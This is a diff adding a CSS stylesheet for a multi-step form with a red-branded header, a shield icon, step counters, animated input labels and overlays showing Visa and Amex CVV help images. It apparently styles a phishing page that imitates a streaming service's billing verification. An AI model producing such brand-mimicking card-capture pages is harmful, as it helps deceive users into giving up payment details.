@@ -1,0 +1,453 @@
+input:focus {
+  outline : none;
+}
+body {
+  margin : 0;
+  padding : 0;
+  font-family : 'Helvetica Neue',Helvetica,Arial,sans-serif;
+}
+select::-ms-expand {
+    display: none;
+}
+.disabled:focus {
+  outline: none;
+}
+
+.header {
+  width : 100%;
+  border-bottom : 1px solid #e6e6e6;
+  height : 90px;
+}
+.header svg {
+  height : 45px;
+  width : 167px;
+  vertical-align : middle;
+  text-decoration : none;
+  fill : #e50914;
+  display : inline-block;
+  line-height : 90px;
+  margin-left : 3%;
+  margin-top : 23px;
+  cursor : pointer;
+}
+.header div {
+  float : right;
+  margin-right : 3%;
+  color : #333;
+  font-size : 19px;
+  margin-top : 35px;
+  font-weight : 700;
+  cursor : pointer;
+}
+.header div:hover {
+  text-decoration : underline;
+}
+.minbody {
+  width : 400px;
+  height : 400px;
+  margin-top : 90px;
+  margin-left : auto;
+  margin-right : auto;
+  background-color : white;
+  padding-top : 40px;
+}
+.minbody .shield {
+  width : 45px;
+  height : 45px;
+  margin-left : auto;
+  margin-right : auto;
+  background-image : url('../img/shield.png');
+  background-size : 45px 45px;
+  background-repeat : no-repeat;
+}
+.minbody .steps {
+  margin-left : auto;
+  margin-right : auto;
+  color : #333;
+  font-size : 13px;
+  width : 78px;
+  margin-top : 25px;
+}
+.minbody h1 {
+  font-size : 23px;
+  font-weight : 700;
+  margin-left : auto;
+  margin-right : auto;
+  text-align : center;
+  margin-top : 1px;
+}
+.minbody ul {
+  list-style : none;
+  margin-top : 25px;
+  margin-left : auto;
+  margin-right : auto;
+}
+.minbody li {
+  padding : 0 0 1em 2em;
+  margin-left : 10px;
+  background-image : url('../img/tick.png');
+  background-size : 14px 14px;
+  background-repeat : no-repeat;
+  background-position : 5px 2px;
+  color : #333;
+  max-width : 200px;
+}
+.minbody button {
+  min-width : 85%;
+  height : 50px;
+  padding : .75rem 25.33333333px;
+  background-color : #e50914;
+  border : 0;
+  margin-left : auto;
+  margin-right : auto;
+  color : #FFF;
+  font-size : 16px;
+  font-weight : 300;
+  border-radius : 3px;
+  text-align : center;
+  cursor : pointer;
+  margin-left : 30px;
+  margin-top : 10px;
+  text-transform : uppercase;
+}
+.minbody button:hover {
+  background-color : #E71F29;
+}
+.footer {
+  width : 100%;
+  margin-top : 20px;
+  background-color : #f3f3f3;
+  border-top : 1px solid #e6e6e6;
+  padding-bottom : 20px;
+  padding-top : 30px;
+  color : #a6a6a6;
+  font-size : 1em;
+}
+.footer .wrapper {
+  width : 89%;
+  margin-left : auto;
+  margin-right : auto;
+}
+.footer .wrapper ul {
+  margin-top : 30px;
+  list-style : none;
+  margin-left : 0;
+  padding : 0;
+}
+.footer .wrapper ul li {
+  display : inline-block;
+  margin-right : 200px;
+  cursor : pointer;
+  margin-left : 0;
+  padding : 0;
+  font-size : 13px;
+}
+.footer .wrapper .a {
+  margin-top : 10px !important;
+}
+.footer .wrapper .a li {
+  margin-right : 110px !important;
+}
+.footer .wrapper ul li:hover {
+  text-decoration : underline;
+}
+.footer .wrapper a {
+  cursor : pointer;
+}
+.footer .wrapper a:hover {
+  text-decoration : underline;
+}
+.footer .wrapper select {
+  margin-top : 0px;
+  height : 48px;
+  border : 1px solid #a6a6a6;
+  border-radius : 2px;
+  padding : 10px 30px 12px 10px;
+  color : #a6a6a6;
+  font-size : 16px;
+  -webkit-appearance: none;
+  -moz-appearance: none;
+  text-indent: 1px;
+  text-overflow: '';
+  background-image : url('../img/globe.png'), url('../img/drop.png');
+  background-size : 16px 16px, 13px 13px;
+  background-repeat : no-repeat, no-repeat;
+  background-position : 13px center, 93% center;
+  padding-left : 40px;
+}
+
+@media(max-width : 500px) {
+  .header {
+    height : 45px;
+  }
+  .header svg {
+    height : 20px;
+    width : 75px;
+    padding-top : 0 !important;
+    margin-top : 14px;
+  }
+  .header div {
+    font-size : 14px;
+    margin-top : 14px;
+  }
+  .minbody {
+    margin-top : 20px;
+  }
+  .minbody .shield {
+    margin-left : 0;
+    margin-right : 0;
+    margin-left : 30px;
+  }
+  .minbody .steps {
+    margin-left : 30px;
+    margin-right : 0;
+  }
+  .minbody h1 {
+    margin-left : -110px !important;
+    margin-right : 0 !important;
+    padding : 0;
+  }
+  .minbody ul {
+    margin-left : -25px;
+    margin-right : 0;
+  }
+  .minbody button {
+    padding : 2px 2px !important;
+    width : 250px !important;
+    min-width : 100px;
+  }
+
+}
+
+
+@media(max-width : 500px) {
+  .step {
+    width : 410px !important;
+  }
+  .step label {
+    margin-left : -350px !important;
+  }
+  .twopac input {
+    margin-right : 42px !important;
+  }
+}
+
+.step {
+  width : 450px;
+  min-height : 400px;
+  margin-top : 20px;
+  margin-left : auto;
+  margin-right : auto;
+  background-color : white;
+  padding-left : 5px;
+}
+
+.step .stepID {
+  font-size : 13px;
+  color : #333;
+}
+.step h1 {
+  font-size : 23px;
+  font-weight : 700;
+  margin-top : 2px;
+}
+.step .form {
+  margin-top : 20px;
+}
+.inputpack {
+  margin-top : 11px;
+}
+.step .form input {
+  width : 75%;
+  height : 50px;
+  padding : 4px 40px 0 10px;
+  border : solid 1px #8c8c8c;
+  border-radius : 2px;
+}
+.step .form label {
+  font-size : 16px;
+  color : #8c8c8c;
+  position : absolute;
+  margin-left : -380px;
+  margin-top : 19px;
+}
+.twopac label {
+  margin-left : 10px !important;
+  margin-top : -37px !important;
+}
+.twopac input {
+  width : 94% !important;
+  padding-right : 0 !important;
+  margin-right : 11.5px;
+}
+.twopac .inputpack {
+  display : inline-block;
+}
+.step button {
+  min-width : 86.7%;
+  height : 50px;
+  padding : .75rem 25.33333333px;
+  background-color : #e50914;
+  border : 0;
+  color : #FFF;
+  font-size : 16px;
+  font-weight : 300;
+  border-radius : 3px;
+  text-align : center;
+  cursor : pointer;
+  margin-top : 10px;
+  text-transform : uppercase;
+}
+.step button:hover {
+  background-color : #E71F29;
+}
+.disabled {
+  cursor : default !important;
+  background-color : #E71F29 !important;
+}
+.labelUP {
+  animation : up 0.1s ease-in forwards;
+}
+.labelDown {
+  animation : down 0.1s ease-in forwards;
+}
+@keyframes up {
+  from {
+    margin-top : 19px;
+    font-size : 16px;
+  }
+  to {
+    margin-top : 5px;
+    font-size : 13px;
+    font-weight : 700;
+  }
+}
+@keyframes down {
+  from {
+    margin-top : 5px;
+    font-size : 13px;
+    font-weight : 700
+  }
+  to {
+    margin-top : 19px;
+    font-size : 16px;
+    font-weight : 300;
+  }
+}
+
+
+.labelUPShort {
+  animation : ups 0.1s ease-in forwards;
+}
+.labelDownShort {
+  animation : downs 0.1s ease-in forwards;
+}
+@keyframes ups {
+  from {
+    margin-top : -37px;
+    font-size : 16px;
+  }
+  to {
+    margin-top : -51px;
+    font-size : 13px;
+    font-weight : 700;
+  }
+}
+@keyframes downs {
+  from {
+    margin-top : -51px;
+    font-size : 13px;
+    font-weight : 700
+  }
+  to {
+    margin-top : -37px;
+    font-size : 16px;
+    font-weight : 300;
+  }
+}
+
+.fadeInAnim {
+  animation : fadee 0.5s ease-out forwards;
+}
+@keyframes fadee {
+  from {
+    opacity : 0;
+    margin-left : 100px;
+  }
+  to {
+    opacity : 1;
+    margin-left : 0;
+  }
+}
+.hidden {
+  display : none;
+}
+
+.inputError {
+  border : 1px solid #b92d2b !important;
+}
+.inputSuccess {
+  border : 1px solid #5fa53f !important;
+}
+.error {
+  font-size : 13px;
+  color : #b92d2b;
+}
+
+.inputpack svg {
+  position : relative;
+  left : -50px;
+  top : 12px;
+}
+
+
+.layer {
+  background-color : rgba(255, 255, 255, 0.9);
+  position : absolute;
+  top : 0;
+  left : 0;
+  bottom : 0;
+  right : 0;
+  z-index : 999;
+  padding : 0;
+  margin : 0;
+}
+.close {
+  background-image : url('../img/close.png');
+  background-size : 15px 15px;
+  background-repeat : no-repeat;
+  width : 15px;
+  height : 15px;
+  position : absolute;
+  top : 20px;
+  right : 20px;
+  cursor : pointer;
+}
+
+.layer .span {
+  margin-top : 80px;
+  max-width : 270px;
+  margin-left : auto;
+  margin-right : auto;
+  text-align : center;
+}
+.layer .bg_visa {
+  width : 200px;
+  height : 130px;
+  background-image : url('../img/visa_cvv.png');
+  background-repeat : no-repeat;
+  background-size : 200px 130px;
+  margin-top : 30px;
+  margin-left : auto;
+  margin-right : auto;
+}
+.layer .bg_amex {
+  width : 200px;
+  height : 130px;
+  background-image : url('../img/amex_cvv.png');
+  background-repeat : no-repeat;
+  background-size : 200px 130px;
+  margin-top : 30px;
+  margin-left : auto;
+  margin-right : auto;
+}
